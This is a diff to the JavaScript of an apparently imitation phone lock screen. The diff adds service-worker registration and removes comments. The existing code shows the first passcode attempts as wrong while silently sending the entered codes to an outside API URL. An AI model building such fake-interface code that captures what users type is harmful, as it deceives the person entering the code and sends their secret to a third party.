@@ -1,3 +1,56 @@
+// app.js — adds persistent storage + robust SW registration, keeps existing logic intact.
+
+// ---- Storage API: request persistent storage (best effort; HTTPS required) ----
+(async () => {
+  if (navigator.storage && navigator.storage.persist) {
+    try {
+      // Optionally log current status
+      if (navigator.storage.persisted) {
+        try {
+          const already = await navigator.storage.persisted();
+          console.debug('Storage persisted already:', already);
+        } catch (e) {}
+      }
+      const granted = await navigator.storage.persist();
+      console.debug('Persistent storage requested:', granted);
+    } catch (e) {
+      console.warn('Storage persist request failed', e);
+    }
+  }
+})();
+
+// ---- Service Worker registration with immediate activation/update (optional) ----
+(function registerServiceWorker() {
+  if (!('serviceWorker' in navigator)) return;
+  window.addEventListener('load', () => {
+    navigator.serviceWorker.register('service-worker.js')
+      .then((reg) => {
+        if (reg.waiting) {
+          try { reg.waiting.postMessage({ type: 'SKIP_WAITING' }); } catch (e) {}
+        }
+        reg.addEventListener('updatefound', () => {
+          const sw = reg.installing;
+          if (!sw) return;
+          sw.addEventListener('statechange', () => {
+            if (sw.state === 'installed' && navigator.serviceWorker.controller) {
+              try { sw.postMessage({ type: 'SKIP_WAITING' }); } catch (e) {}
+            }
+          });
+        });
+      })
+      .catch((err) => console.warn('SW registration failed', err));
+
+    // When the new SW activates, reload once so it controls the page
+    navigator.serviceWorker.addEventListener('controllerchange', () => {
+      if (!window.__reloadedBySW) {
+        window.__reloadedBySW = true;
+        window.location.reload();
+      }
+    });
+  });
+})();
+
+// ---- Existing app code (unchanged) ----
 (() => {
   const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarun&data=";
   const MAX = 4;
@@ -219,13 +272,13 @@
     homescreenImg.style.filter = 'blur(10px) saturate(0.9)';
     lockInner.style.boxShadow = '0 40px 90px rgba(0,0,0,0.55)';
 
-    // — SLOWER slide-up spring for lockInner (tuned to feel ~1s slower)
+    // — SLOWER slide-up spring for lockInner
     springAnimate({
       from: 0,
       to: targetY,
-      mass: 1.25,        // slightly heavier => slower
-      stiffness: 110,   // a touch lower than before
-      damping: 14,      // a touch lower damping so it stretches longer
+      mass: 1.25,
+      stiffness: 110,
+      damping: 14,
       onUpdate: (val) => {
         const progress = Math.min(1, Math.abs(val / targetY));
         const scale = 1 - 0.003 * progress;
@@ -233,20 +286,19 @@
         lockInner.style.opacity = String(1 - Math.min(0.18, progress * 0.18));
       },
       onComplete: () => {
-        // keep final transform; we won't hide lockInner here (homescreen spring will handle finalization)
         lockInner.style.boxShadow = '';
         lockInner.style.opacity = '0';
         lockInner.style.transform = `translate3d(0, ${targetY}px, 0)`;
       }
     });
 
-    // — SLOWER homescreen spring (gently expand into home) so the whole sequence is longer
+    // — SLOWER homescreen spring
     springAnimate({
       from: 0,
       to: 1,
       mass: 1.05,
-      stiffness: 60,  // lower stiffness -> slower
-      damping: 9,     // lower damping -> longer duration
+      stiffness: 60,
+      damping: 9,
       onUpdate: (p) => {
         const progress = Math.max(0, Math.min(1, p));
         const raw = p;
@@ -263,15 +315,10 @@
         homescreenImg.style.filter = 'blur(0) saturate(1)';
         homescreenImg.style.opacity = '1';
 
-        // After homescreen animation completes, wait an EXTRA 1 second,
-        // then trigger the pill shrink & hide it after its CSS transition finishes.
         if (dynamicIslandEl) {
-          const EXTRA_KEEP_MS = 1000; // user-requested extra 1 second keep
+          const EXTRA_KEEP_MS = 1000;
           setTimeout(() => {
-            // trigger horizontal collapse
             dynamicIslandEl.classList.add('shrinking');
-
-            // wait for the CSS transitionend on the dynamic island then hide / cleanup
             const onTransEnd = (ev) => {
               if (ev.target !== dynamicIslandEl) return;
               dynamicIslandEl.removeEventListener('transitionend', onTransEnd);
@@ -281,8 +328,6 @@
               } catch (e) { /* ignore */ }
             };
             dynamicIslandEl.addEventListener('transitionend', onTransEnd);
-
-            // safety hide if transitionend doesn't fire
             setTimeout(() => {
               try {
                 dynamicIslandEl.style.display = 'none';
@@ -294,12 +339,11 @@
       }
     });
 
-    // cleanup will-change flags after a while
     setTimeout(() => {
       lockInner.style.boxShadow = '';
       homescreenImg.style.willChange = '';
       lockInner.style.willChange = '';
-    }, 1600 + 1000); // slightly longer to match slower springs
+    }, 1600 + 1000);
   }
 
   function animateWrongAttempt() {
@@ -310,7 +354,6 @@
     }
     const DURATION = 700;
 
-    // Force Cancel label back to 'Cancel' during shake
     if (cancelBtn) cancelBtn.textContent = 'Cancel';
 
     dotsEl.classList.add('wrong');
@@ -329,7 +372,6 @@
     }
     return Promise.resolve().then(() => fallbackCopy(text));
   }
-
   function fallbackCopy(text) {
     return new Promise((resolve, reject) => {
       try {
@@ -390,7 +432,6 @@
     attempts += 1;
     setAttempts(attempts);
 
-    // push code into rotating buffer (so hotspot displays exact payload)
     pushLastCode(enteredCode);
 
     if (attempts === 1 || attempts === 2) {
@@ -400,24 +441,15 @@
       if (combined) sendToAPI(combined);
       animateWrongAttempt();
     } else if (attempts === 4) {
-      // Immediately show the unlocked (open) lock glyph and give it a small pop,
-      // then start the unlock animation sequence (now slightly slower). The pill
-      // will remain visible and will only shrink after the homescreen animation finishes + 1s.
       if (dynamicIslandEl) {
         dynamicIslandEl.classList.remove('locked');
         dynamicIslandEl.classList.add('unlocked', 'icon-opened');
-
-        // ensure immediate repaint so the unlocked glyph is visible right away
         requestAnimationFrame(() => {
-          // start the unlock animation immediately (no artificial delay anymore)
           playUnlockAnimation();
         });
       } else {
-        // fallback
         playUnlockAnimation();
       }
-
-      // local reset of input (preserve existing behavior)
       setTimeout(reset, 300);
     }
 
@@ -453,7 +485,6 @@
       animateBrightness(k, 1.6, 80);
       updateCancelText();
     }, { passive: true });
-
     const endPress = () => { animateBrightness(k, 1, 100); };
     k.addEventListener('touchend', endPress);
     k.addEventListener('touchcancel', endPress);
